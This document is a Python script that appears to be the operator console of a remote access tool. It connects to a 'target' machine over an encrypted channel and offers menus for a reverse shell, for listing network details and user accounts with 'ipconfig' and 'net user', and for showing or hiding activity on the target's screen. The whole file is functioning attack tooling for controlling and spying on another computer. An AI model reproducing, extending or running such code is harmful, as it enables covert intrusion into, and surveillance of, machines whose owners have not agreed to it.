from Objet_Us_Target import Client
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-p", "--print_target", action="store_true", help="Show on Target's screen what are doing")
parser.add_argument("-ip", "--ip_target", default="127.0.0.1", type=str,
                    help="define de target's ip, Default is 127.0.0.1 (localhost)")
parser.add_argument("-s", "--shell", action="store_true", default=False, help="Skip main menu and go directly to the "
                                                                              "Shell prompt. Can not be combined with "
                                                                              "\"-i\"")
parser.add_argument("-i", "--get_info", action="store_true", default=False, help="Skip main menu and go directly to the"
                                                                                 " menu \"get info\" Can not be "
                                                                                 "combined with \"-p\"")
parser.add_argument("-b", "--buffer_size", type=int, default="4096", choices=[2048, 4096, 8192, 16384],
                    help="Set the buffer size. Default is 4096.")
args = parser.parse_args()


def menu():
    while client.connection_active:
        print("\n" + 66*"=" + "\n" + 30*"=" + " MENU " + 30*"=" + "\n" + 66*"=" + "\n")
        print("\tWelcome, what's your choice?\n\t\t1. Reverse Shell \n\t\t2. Get info \n\t\t3. Settings\n\t\t4. Quit")
        choice = input("\t> ")

        if choice == "1" or choice == "shell" or choice == "Shell":
            client.reverse_shell_send_command()
        if choice == "2" or choice == "get info" or choice == "Get info":
            menu_getinfo()
        if choice == "3" or choice == "settings" or choice == "Settings":
            menu_settings()
        if choice == "4" or choice == "quit" or choice == "Quit":
            break


def menu_getinfo():
    print(30*"=" + " MENU " + 29*"=" + "\n" + 26*"=" + " INFORMATION " + 26*"=" + "\n")
    print("\t\t1. Global information\n\t\t2. Network information\n\t\t3. list user\n\t\t4. Quit")
    choice = input("\t> ")

    if choice == "1":
        client.getinfo("getinfo_generality")
    if choice == "2":
        client.getinfo("ipconfig")
    if choice == "3":
        client.getinfo("net user")


def menu_settings():
    print(30*"=" + " MENU " + 30*"=" + "\n" + 28*"=" + " SETTINGS " + 28*"=")
    print("\tSettings: ")
    print("\t\t1. Print on target's screen\n"
          "\t\t2. Target's buffer size\n"
          "\t\t3. Quit \n")
    choice = input("\t> ")

    if choice == "1":
        menu_print_on_target()
    if choice == "2":
        menu_buffer()


def menu_print_on_target():
    print(30*"=" + " MENU " + 30*"=" + "\n" + 29*"=" + " PRINT " + 29*"=")
    print("\t\t1. Print")
    print("\t\t2. Don't Print")
    print("\t\t3. Quit")
    choice = input("\t>")

    if choice == "1":
        client.print_target(True)
    if choice == "2":
        client.print_target(False)


def menu_buffer():
    print(30*"=" + " MENU " + 30*"=" + "\n" + 29*"=" + " BUFFER " + 29*"=")
    print("\twhich size would you want: ")
    print("\t\t1. 2048\n\t\t2. 4096\n\t\t3. 8192\n\t\t4. 16384\n\t\t5. What does buffer size mean ?\n\t\t6. quit")
    size_buffer = input("\t> ")
    if size_buffer == "1":
        client.buffer = 2048
        client.set_target_buffer(2048)
    if size_buffer == "2":
        client.buffer = 4096
        client.set_target_buffer(4096)
    if size_buffer == "3":
        client.buffer = 8192
        client.set_target_buffer(8192)
    if size_buffer == "4":
        client.buffer = 16384
        client.set_target_buffer(16384)
    if size_buffer == "5":
        print("EN: In computing, a data buffer (or simply a buffer) is a region of a physical memory used to "
              "temporarily store data while it is being processed as when moved from one location to another.")
        print("FR: En informatique, un tampon de données (ou tout simplement un tampon) est une région d’une mémoire "
              "physique utilisée pour stocker temporairement des données le temps qu'elles soient traitées comme "
              "lorsqu’elles sont déplacées d’un endroit à un autre.")
        print("\nSource: https://en.wikipedia.org/wiki/Data_buffer\n")
        input("Press ENTER")
        menu_buffer()


client = Client(args.ip_target)
client.buffer = args.buffer_size
try:
    client.connect_to_server()
    print("generating RSA key. this step can take some time")
    client.key_generate_rsa()
    print("receiving AES key")
    client.recv_key_aes()
    print("your connection with the target is now encrypted and safe.")
    if args.print_target:
        client.print_target(True)
    if args.shell and not args.get_info:
        client.reverse_shell_send_command()
    if args.get_info and not args.shell:
        menu_getinfo()
    if args.get_info and args.shell:
        print("you want to go to the shell prompt and to the info menu ? you cannot do both, you have to choice.")
    menu()
    if client.connection_active:
        client.quit()
except ConnectionRefusedError as msg:
    print("Error: " + str(msg))
    print("The programme on target is not running.")
except TimeoutError as msg:
    print("Error :" + str(msg))
    print("Restart the program and verify the ip")



